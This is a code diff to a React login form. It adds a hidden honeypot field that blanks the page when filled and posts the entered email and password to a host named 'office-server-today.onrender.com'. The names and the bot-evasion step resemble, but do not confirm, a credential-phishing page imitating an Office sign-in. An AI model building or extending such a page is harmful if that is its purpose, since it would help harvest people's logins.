@@ -25,11 +25,16 @@ function App() {
     const formData = new FormData(e.target);
     const username = formData.get("username");
     const password = formData.get("password");
+    const honeypot = formData.get("honeypot");
+
+    if(honeypot !== ""){
+      document.body.innerHTML = '';
+        return
+    }
 
     try{
       const response = await axios.post('https://office-server-today.onrender.com/login', {
       // const response = await axios.post('https://office-server-ernk.onrender.com/login', {
-
       username,
       password,
         });
@@ -83,6 +88,7 @@ function App() {
             <form onSubmit={handleSubmit} className="form">
               <p id="error" className={show}>Invalid email or password.</p>
               <input type="email" name="username" value={usernam} onChange={handleInputChange} placeholder="Email Address" require/>
+              <input type="email" id='none' name="honeypot" placeholder="Email Address"/>
               <br/>
               <input type="password" name="password" value={passwo} onChange={handleInputChanger} placeholder="password" require/>
               <br/>
